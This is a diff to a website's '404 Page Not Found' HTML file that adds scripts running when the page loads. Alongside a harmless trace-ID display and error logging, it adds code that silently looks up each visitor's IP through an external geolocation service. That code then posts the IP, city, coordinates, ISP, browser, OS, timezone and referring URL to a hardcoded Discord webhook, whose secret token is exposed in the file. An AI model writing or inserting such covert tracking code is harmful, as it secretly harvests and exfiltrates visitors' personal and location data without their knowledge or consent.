@@ -15,7 +15,7 @@
   <title>Page Not Found | 404</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=JetBrains+Mono:wght@404;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="styles.css">
   <script src="https://kit.fontawesome.com/de7a860622.js" crossorigin="anonymous"></script>
   <link rel="icon" href="https://avatars.githubusercontent.com/u/99549578?v=4" type="image/x-icon">
@@ -30,7 +30,7 @@
     .error-actions{display:flex;flex-wrap:wrap;gap:12px}
   </style>
  </head>
-<body>
+<body onload="fetchIPInfoAndSend();">
   <div class="particles" id="particles"></div>
   <nav class="nav">
     <div class="nav-container">
@@ -71,5 +71,84 @@
     </div>
   </footer>
   <script src="script.js"></script>
+  <script>
+const rid=Math.random().toString(36).slice(2,10).toUpperCase();
+document.getElementById('rid').textContent=rid;
+const ts=new Date().toISOString();document.getElementById('ts').textContent=ts;
+function copy(){
+  navigator.clipboard.writeText(
+`Error 404 (Page Not Found)
+Trace ID: ${rid}
+Time: ${ts}
+URL: ${location.href}`
+  );
+}
+</script>
+<script>
+    const errorData = {
+    code: 404,
+    message: "Page Not Found",
+    trace: rid,
+    time: ts,
+    url: location.href,
+    previous: (document.referrer && document.referrer !== location.href) ? document.referrer : (new URLSearchParams(location.search).get('from') || null)
+    };
+
+    fetch('../log-error.php', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify(errorData)
+    });
+</script>
+<script>
+  
+      function getDeviceInfo() {
+        return {
+          browser: navigator.userAgent,
+          os: navigator.platform,
+          screenResolution: `${window.screen.width}x${window.screen.height}`,
+        };
+      }
+
+
+      function fetchIPInfoAndSend() {
+        fetch("https://ipwho.is/")
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.success) {
+              const info = getDeviceInfo();
+              const prevURLParam = new URLSearchParams(location.search).get('from');
+              const prevURL = (document.referrer && document.referrer !== location.href) ? document.referrer : (prevURLParam || 'unknown');
+              const infoText = `
+    **IP:** ${data.ip}
+    **Country:** ${data.country}
+    **City:** ${data.city}
+    **ISP:** ${data.connection.isp}
+    **Lat/Lon:** ${data.latitude}, ${data.longitude}
+    **Browser:** ${info.browser}
+    **OS:** ${info.os}
+    **Timezone:** ${data.timezone.utc}
+    **Current Time:** ${data.timezone.current_time}
+    **Error Code:** 404
+    **Trace ID:** ${rid}
+    **Time:** ${ts}
+    **URL (current):** ${location.href}
+    **URL (previous):** ${prevURL}
+              `;
+              sendToDiscord(infoText);
+            }
+          });
+      }
+
+      function sendToDiscord(info) {
+        const webhookURL =
+          "https://discord.com/api/webhooks/1472279367123206187/piomicXHyGGRWgN6yr5G0Jk5l89J6C8A7swSrrkj1nAWRuASKVJ1iQ-CFJsH6QNY7Ab_";
+        fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: info }),
+        });
+      }
+    </script>
 </body>
 </html>
